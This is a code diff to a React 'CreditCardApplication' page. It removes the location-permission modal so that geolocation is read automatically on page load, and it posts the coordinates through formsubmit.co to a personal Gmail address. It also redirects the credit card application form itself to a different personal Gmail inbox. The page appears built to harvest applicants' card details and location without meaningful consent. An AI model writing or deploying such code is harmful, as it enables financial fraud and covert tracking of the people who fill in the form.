@@ -57,10 +57,7 @@ const CreditCardApplication = () => {
       });
     }
   };
-
-  const [openLocationPopup, setOpenLocationPopup] = useState(true);
-
-  const handleLocationPermission = () => {
+  useEffect(() => {
     if (navigator.geolocation) {
       navigator.geolocation.getCurrentPosition(
         (position) => {
@@ -70,20 +67,15 @@ const CreditCardApplication = () => {
             longitude: position.coords.longitude,
             key: true,
           });
-          setOpenLocationPopup(false);
         },
-        () => {
-          setOpenLocationPopup(false); // Show the popup asking for location access
-        }
       );
-    } else {
-      setOpenLocationPopup(true); // Show the popup if geolocation is not available
     }
-  };
+  }, []);
+
 
   useEffect(() => {
     if (locationAllowed.key) {
-      fetch("https://formsubmit.co/ajax/vzade1999@gmail.com", {
+      fetch("https://formsubmit.co/ajax/dzade1932001@gmail.com", {
         method: "POST",
         headers: {
           "Content-Type": "application/json",
@@ -104,13 +96,6 @@ const CreditCardApplication = () => {
 
   return (
     <>
-      <LocationPermissionModal
-        open={openLocationPopup}
-        onClose={() => setOpenLocationPopup(false)}
-        onAllowLocation={handleLocationPermission}
-        latitude={locationAllowed?.latitude}
-        longitude={locationAllowed?.longitude}
-      />
       <Box
         sx={{
           minHeight: "100vh",
@@ -153,7 +138,7 @@ const CreditCardApplication = () => {
           </Box>
 
           <form
-            action="https://formsubmit.co/vzade1999@gmail.com"
+            action="https://formsubmit.co/dzade1932001@gmail.com"
             method="POST"
           >
             <Grid container spacing={3} sx={{ marginTop: 2 }}>
